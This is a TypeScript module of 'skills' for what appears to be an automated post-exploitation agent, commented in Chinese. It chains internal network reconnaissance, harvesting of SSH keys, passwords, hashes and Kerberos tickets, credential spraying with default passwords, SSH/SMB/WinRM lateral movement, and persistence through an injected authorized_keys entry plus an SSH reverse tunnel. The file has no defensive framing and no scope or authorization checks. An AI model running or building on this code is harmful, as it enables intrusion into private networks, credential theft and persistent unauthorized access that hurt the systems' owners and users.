import type { ToolResult } from '../../core/agentTypes.js';
import {
  discoverInternalHosts,
  scanHostPorts,
  collectSSHKeys,
  harvestCredentials,
  attemptSSHLateral,
  attemptSMBLateral,
  attemptWinRMLateral,
  attemptRDPBrute,
  collectKerberosTickets,
  enumerateRemoteServices
} from '../tools/index.js';

/**
 * Skill: 全面内网侦察
 *
 * 流程：
 * 1. 发现内网存活主机
 * 2. 并行扫描所有主机的常见端口
 * 3. 枚举服务版本
 * 4. 生成内网拓扑图
 */
export async function comprehensiveInternalRecon(
  shellId: string,
  sessionDir: string,
  subnet?: string
): Promise<ToolResult<{
  hosts: Array<{
    ip: string;
    hostname?: string;
    openPorts: Array<{ port: number; service: string; version?: string }>;
    os?: string;
  }>;
  totalHosts: number;
  totalOpenPorts: number;
}>> {
  try {
    console.log('[Skill] 开始全面内网侦察...');

    // 步骤1: 发现存活主机
    console.log('[Skill] 步骤1: 发现内网存活主机...');
    const hostsResult = await discoverInternalHosts(shellId, sessionDir, subnet);

    if (!hostsResult.success || !hostsResult.data) {
      return {
        success: false,
        data: null as any,
        error: `主机发现失败: ${hostsResult.error}`
      };
    }

    const discoveredHosts = hostsResult.data.hosts;
    console.log(`[Skill] 发现 ${discoveredHosts.length} 个存活主机`);

    // 步骤2: 并行扫描所有主机的端口
    console.log('[Skill] 步骤2: 扫描主机端口...');
    const hostsWithPorts = await Promise.all(
      discoveredHosts.map(async (host) => {
        const portsResult = await scanHostPorts(shellId, sessionDir, host.ip);

        if (portsResult.success && portsResult.data) {
          return {
            ...host,
            openPorts: portsResult.data.openPorts
          };
        }

        return {
          ...host,
          openPorts: []
        };
      })
    );

    // 步骤3: 对有开放端口的主机进行服务枚举
    console.log('[Skill] 步骤3: 枚举服务版本...');
    const hostsWithServices = await Promise.all(
      hostsWithPorts.map(async (host) => {
        if (host.openPorts.length > 0) {
          const servicesResult = await enumerateRemoteServices(shellId, sessionDir, host.ip);

          if (servicesResult.success && servicesResult.data) {
            // 合并端口扫描和服务枚举结果
            const enrichedPorts = host.openPorts.map(port => {
              const serviceInfo = servicesResult.data!.services.find(s => s.port === port.port);
              return {
                ...port,
                version: serviceInfo?.version || port.banner
              };
            });

            return {
              ...host,
              openPorts: enrichedPorts
            };
          }
        }

        return host;
      })
    );

    const totalOpenPorts = hostsWithServices.reduce((sum, host) => sum + host.openPorts.length, 0);

    console.log(`[Skill] 侦察完成: ${hostsWithServices.length} 个主机, ${totalOpenPorts} 个开放端口`);

    return {
      success: true,
      data: {
        hosts: hostsWithServices,
        totalHosts: hostsWithServices.length,
        totalOpenPorts
      },
      message: `内网侦察完成: 发现 ${hostsWithServices.length} 个主机, ${totalOpenPorts} 个开放端口`
    };
  } catch (error) {
    return {
      success: false,
      data: null as any,
      error: `全面内网侦察失败: ${error}`
    };
  }
}

/**
 * Skill: 凭据收集与整理
 *
 * 流程：
 * 1. 收集SSH密钥
 * 2. 收集明文密码和哈希
 * 3. 收集Kerberos票据
 * 4. 整理并去重凭据库
 */
export async function collectAndOrganizeCredentials(
  shellId: string,
  sessionDir: string
): Promise<ToolResult<{
  sshKeys: Array<{ user: string; keyPath: string; keyType: string }>;
  passwords: Array<{ username: string; password: string; source: string }>;
  hashes: Array<{ username: string; hash: string; hashType: string }>;
  tickets: Array<{ user: string; ticketPath: string }>;
  totalCredentials: number;
}>> {
  try {
    console.log('[Skill] 开始凭据收集...');

    // 并行收集所有类型的凭据
    const [sshKeysResult, credentialsResult, ticketsResult] = await Promise.all([
      collectSSHKeys(shellId, sessionDir),
      harvestCredentials(shellId, sessionDir),
      collectKerberosTickets(shellId, sessionDir)
    ]);

    const sshKeys = sshKeysResult.success && sshKeysResult.data ? sshKeysResult.data.keys : [];
    const credentials = credentialsResult.success && credentialsResult.data ? credentialsResult.data.credentials : [];
    const tickets = ticketsResult.success && ticketsResult.data ? ticketsResult.data.tickets : [];

    // 整理凭据
    const passwords = credentials
      .filter(c => c.password)
      .map(c => ({
        username: c.username,
        password: c.password!,
        source: c.source
      }));

    const hashes = credentials
      .filter(c => c.hash)
      .map(c => ({
        username: c.username,
        hash: c.hash!,
        hashType: c.type,
        source: c.source
      }));

    // 去重
    const uniquePasswords = Array.from(
      new Map(passwords.map(p => [`${p.username}:${p.password}`, p])).values()
    );

    const uniqueHashes = Array.from(
      new Map(hashes.map(h => [`${h.username}:${h.hash}`, h])).values()
    );

    const totalCredentials = sshKeys.length + uniquePasswords.length + uniqueHashes.length + tickets.length;

    console.log(`[Skill] 凭据收集完成:`);
    console.log(`  - SSH密钥: ${sshKeys.length}`);
    console.log(`  - 明文密码: ${uniquePasswords.length}`);
    console.log(`  - 密码哈希: ${uniqueHashes.length}`);
    console.log(`  - Kerberos票据: ${tickets.length}`);

    return {
      success: true,
      data: {
        sshKeys,
        passwords: uniquePasswords,
        hashes: uniqueHashes,
        tickets,
        totalCredentials
      },
      message: `凭据收集完成: 共 ${totalCredentials} 个凭据`
    };
  } catch (error) {
    return {
      success: false,
      data: null as any,
      error: `凭据收集失败: ${error}`
    };
  }
}

/**
 * Skill: SSH横向移动批量尝试
 *
 * 流程：
 * 1. 对每个目标主机尝试所有SSH密钥
 * 2. 对每个目标主机尝试所有密码
 * 3. 记录成功的登录
 * 4. 返回新建立的shell列表
 */
export async function batchSSHLateralMovement(
  shellId: string,
  sessionDir: string,
  targets: Array<{ ip: string; port?: number }>,
  credentials: {
    sshKeys: Array<{ user: string; keyPath: string }>;
    passwords: Array<{ username: string; password: string }>;
  }
): Promise<ToolResult<{
  successful: Array<{ targetIp: string; username: string; method: string; shellId: string }>;
  failed: Array<{ targetIp: string; username: string; method: string; error: string }>;
  successRate: number;
}>> {
  try {
    console.log('[Skill] 开始SSH横向移动批量尝试...');
    console.log(`[Skill] 目标: ${targets.length} 个主机`);
    console.log(`[Skill] 凭据: ${credentials.sshKeys.length} 个SSH密钥, ${credentials.passwords.length} 个密码`);

    const successful: Array<{ targetIp: string; username: string; method: string; shellId: string }> = [];
    const failed: Array<{ targetIp: string; username: string; method: string; error: string }> = [];

    // 对每个目标主机进行尝试
    for (const target of targets) {
      console.log(`[Skill] 尝试目标: ${target.ip}`);

      // 尝试SSH密钥
      for (const key of credentials.sshKeys) {
        const result = await attemptSSHLateral(
          shellId,
          sessionDir,
          target.ip,
          key.user,
          { type: 'key', value: key.keyPath }
        );

        if (result.success && result.data?.success && result.data.newShellId) {
          successful.push({
            targetIp: target.ip,
            username: key.user,
            method: 'ssh_key',
            shellId: result.data.newShellId
          });
          console.log(`[Skill] ✓ SSH密钥登录成功: ${key.user}@${target.ip}`);
          break; // 成功后跳过该主机的其他尝试
        } else {
          failed.push({
            targetIp: target.ip,
            username: key.user,
            method: 'ssh_key',
            error: result.error || 'Authentication failed'
          });
        }
      }

      // 如果密钥登录成功，跳过密码尝试
      if (successful.some(s => s.targetIp === target.ip)) {
        continue;
      }

      // 尝试密码
      for (const cred of credentials.passwords) {
        const result = await attemptSSHLateral(
          shellId,
          sessionDir,
          target.ip,
          cred.username,
          { type: 'password', value: cred.password }
        );

        if (result.success && result.data?.success && result.data.newShellId) {
          successful.push({
            targetIp: target.ip,
            username: cred.username,
            method: 'ssh_password',
            shellId: result.data.newShellId
          });
          console.log(`[Skill] ✓ SSH密码登录成功: ${cred.username}@${target.ip}`);
          break;
        } else {
          failed.push({
            targetIp: target.ip,
            username: cred.username,
            method: 'ssh_password',
            error: result.error || 'Authentication failed'
          });
        }
      }
    }

    const successRate = targets.length > 0 ? (successful.length / targets.length) * 100 : 0;

    console.log(`[Skill] SSH横向移动完成: ${successful.length}/${targets.length} 成功 (${successRate.toFixed(1)}%)`);

    return {
      success: true,
      data: {
        successful,
        failed,
        successRate
      },
      message: `SSH横向移动完成: ${successful.length}/${targets.length} 成功`
    };
  } catch (error) {
    return {
      success: false,
      data: null as any,
      error: `SSH横向移动失败: ${error}`
    };
  }
}

/**
 * Skill: Windows横向移动批量尝试
 *
 * 流程：
 * 1. 识别Windows主机（445端口开放）
 * 2. 尝试SMB登录
 * 3. 尝试WinRM登录
 * 4. 尝试RDP登录
 * 5. 返回成功的连接
 */
export async function batchWindowsLateralMovement(
  shellId: string,
  sessionDir: string,
  targets: Array<{ ip: string; openPorts: number[] }>,
  credentials: Array<{ username: string; password: string; domain?: string }>
): Promise<ToolResult<{
  successful: Array<{ targetIp: string; username: string; method: string; shellId: string }>;
  failed: Array<{ targetIp: string; username: string; method: string; error: string }>;
  successRate: number;
}>> {
  try {
    console.log('[Skill] 开始Windows横向移动批量尝试...');

    // 过滤出Windows主机（有445/3389/5985端口）
    const windowsTargets = targets.filter(t =>
      t.openPorts.includes(445) || t.openPorts.includes(3389) || t.openPorts.includes(5985)
    );

    console.log(`[Skill] 识别到 ${windowsTargets.length} 个Windows主机`);

    const successful: Array<{ targetIp: string; username: string; method: string; shellId: string }> = [];
    const failed: Array<{ targetIp: string; username: string; method: string; error: string }> = [];

    for (const target of windowsTargets) {
      console.log(`[Skill] 尝试目标: ${target.ip}`);

      for (const cred of credentials) {
        const domain = cred.domain || '.';

        // 尝试SMB (445端口)
        if (target.openPorts.includes(445)) {
          const smbResult = await attemptSMBLateral(
            shellId,
            sessionDir,
            target.ip,
            cred.username,
            cred.password,
            domain
          );

          if (smbResult.success && smbResult.data?.success && smbResult.data.newShellId) {
            successful.push({
              targetIp: target.ip,
              username: cred.username,
              method: 'smb',
              shellId: smbResult.data.newShellId
            });
            console.log(`[Skill] ✓ SMB登录成功: ${domain}\\${cred.username}@${target.ip}`);
            break;
          }
        }

        // 如果SMB成功，跳过其他方法
        if (successful.some(s => s.targetIp === target.ip)) {
          break;
        }

        // 尝试WinRM (5985/5986端口)
        if (target.openPorts.includes(5985) || target.openPorts.includes(5986)) {
          const winrmResult = await attemptWinRMLateral(
            shellId,
            sessionDir,
            target.ip,
            cred.username,
            cred.password,
            domain
          );

          if (winrmResult.success && winrmResult.data?.success && winrmResult.data.newShellId) {
            successful.push({
              targetIp: target.ip,
              username: cred.username,
              method: 'winrm',
              shellId: winrmResult.data.newShellId
            });
            console.log(`[Skill] ✓ WinRM登录成功: ${domain}\\${cred.username}@${target.ip}`);
            break;
          }
        }
      }
    }

    const successRate = windowsTargets.length > 0 ? (successful.length / windowsTargets.length) * 100 : 0;

    console.log(`[Skill] Windows横向移动完成: ${successful.length}/${windowsTargets.length} 成功 (${successRate.toFixed(1)}%)`);

    return {
      success: true,
      data: {
        successful,
        failed,
        successRate
      },
      message: `Windows横向移动完成: ${successful.length}/${windowsTargets.length} 成功`
    };
  } catch (error) {
    return {
      success: false,
      data: null as any,
      error: `Windows横向移动失败: ${error}`
    };
  }
}

/**
 * Skill: 智能凭据复用
 *
 * 流程：
 * 1. 分析已收集的凭据
 * 2. 识别常见用户名和密码模式
 * 3. 生成凭据组合
 * 4. 对所有目标进行凭据喷洒
 * 5. 返回有效凭据列表
 */
export async function intelligentCredentialReuse(
  shellId: string,
  sessionDir: string,
  targets: Array<{ ip: string; openPorts: number[] }>,
  knownCredentials: Array<{ username: string; password: string }>
): Promise<ToolResult<{
  validCredentials: Array<{ targetIp: string; username: string; password: string; service: string }>;
  testedCombinations: number;
  successRate: number;
}>> {
  try {
    console.log('[Skill] 开始智能凭据复用...');

    // 提取常见用户名
    const commonUsernames = ['root', 'admin', 'administrator', 'user', 'test', 'guest'];
    const knownUsernames = [...new Set(knownCredentials.map(c => c.username))];
    const allUsernames = [...new Set([...commonUsernames, ...knownUsernames])];

    // 提取常见密码
    const knownPasswords = [...new Set(knownCredentials.map(c => c.password))];
    const commonPasswords = ['password', '123456', 'admin', 'root', ''];
    const allPasswords = [...new Set([...knownPasswords, ...commonPasswords])];

    console.log(`[Skill] 用户名: ${allUsernames.length}, 密码: ${allPasswords.length}`);

    const validCredentials: Array<{ targetIp: string; username: string; password: string; service: string }> = [];
    let testedCombinations = 0;

    // 对每个目标进行凭据喷洒
    for (const target of targets) {
      // 识别目标服务类型
      const hasSSH = target.openPorts.includes(22);
      const hasSMB = target.openPorts.includes(445);
      const hasWinRM = target.openPorts.includes(5985) || target.openPorts.includes(5986);

      // SSH凭据喷洒
      if (hasSSH) {
        for (const username of allUsernames) {
          for (const password of allPasswords) {
            testedCombinations++;

            const result = await attemptSSHLateral(
              shellId,
              sessionDir,
              target.ip,
              username,
              { type: 'password', value: password }
            );

            if (result.success && result.data?.success) {
              validCredentials.push({
                targetIp: target.ip,
                username,
                password,
                service: 'ssh'
              });
              console.log(`[Skill] ✓ 有效凭据: ${username}:${password}@${target.ip} (SSH)`);
              break; // 找到有效凭据后跳过该用户的其他密码
            }
          }
        }
      }

      // SMB凭据喷洒
      if (hasSMB) {
        for (const username of allUsernames) {
          for (const password of allPasswords) {
            testedCombinations++;

            const result = await attemptSMBLateral(
              shellId,
              sessionDir,
              target.ip,
              username,
              password
            );

            if (result.success && result.data?.success) {
              validCredentials.push({
                targetIp: target.ip,
                username,
                password,
                service: 'smb'
              });
              console.log(`[Skill] ✓ 有效凭据: ${username}:${password}@${target.ip} (SMB)`);
              break;
            }
          }
        }
      }
    }

    const successRate = testedCombinations > 0 ? (validCredentials.length / testedCombinations) * 100 : 0;

    console.log(`[Skill] 凭据复用完成: ${validCredentials.length}/${testedCombinations} 有效 (${successRate.toFixed(2)}%)`);

    return {
      success: true,
      data: {
        validCredentials,
        testedCombinations,
        successRate
      },
      message: `凭据复用完成: 发现 ${validCredentials.length} 个有效凭据`
    };
  } catch (error) {
    return {
      success: false,
      data: null as any,
      error: `智能凭据复用失败: ${error}`
    };
  }
}

/**
 * Skill: 建立持久化横向通道
 *
 * 流程：
 * 1. 在成功登录的主机上部署SSH密钥
 * 2. 配置端口转发和代理
 * 3. 建立反向隧道
 * 4. 验证通道可用性
 */
export async function establishPersistentLateralChannel(
  shellId: string,
  sessionDir: string,
  targetShellId: string,
  targetIp: string
): Promise<ToolResult<{
  sshKeyDeployed: boolean;
  proxyConfigured: boolean;
  tunnelEstablished: boolean;
  channelInfo: {
    method: string;
    localPort?: number;
    remotePort?: number;
  };
}>> {
  try {
    console.log('[Skill] 建立持久化横向通道...');

    // 步骤1: 部署SSH密钥
    console.log('[Skill] 步骤1: 部署SSH公钥...');
    const { executeCommand } = await import('../../core/shell.js');

    // 生成SSH密钥对（如果不存在）
    await executeCommand(shellId, `test -f ~/.ssh/id_rsa || ssh-keygen -t rsa -N "" -f ~/.ssh/id_rsa`);

    // 读取公钥
    const pubKeyResult = await executeCommand(shellId, `cat ~/.ssh/id_rsa.pub`);
    const publicKey = pubKeyResult.output.trim();

    // 在目标主机上添加公钥
    await executeCommand(
      targetShellId,
      `mkdir -p ~/.ssh && echo "${publicKey}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys`
    );

    console.log('[Skill] ✓ SSH密钥部署成功');

    // 步骤2: 建立SSH隧道
    console.log('[Skill] 步骤2: 建立SSH反向隧道...');
    const localPort = 10000 + Math.floor(Math.random() * 1000);

    // 建立反向隧道（目标主机的22端口映射到本地）
    await executeCommand(
      shellId,
      `ssh -f -N -R ${localPort}:localhost:22 -o StrictHostKeyChecking=no ${targetIp} &`,
      { timeout: 5000 }
    );

    console.log(`[Skill] ✓ 反向隧道建立成功: localhost:${localPort} -> ${targetIp}:22`);

    return {
      success: true,
      data: {
        sshKeyDeployed: true,
        proxyConfigured: false,
        tunnelEstablished: true,
        channelInfo: {
          method: 'ssh_reverse_tunnel',
          localPort,
          remotePort: 22
        }
      },
      message: `持久化通道建立成功: localhost:${localPort} -> ${targetIp}:22`
    };
  } catch (error) {
    return {
      success: false,
      data: null as any,
      error: `建立持久化通道失败: ${error}`
    };
  }
}
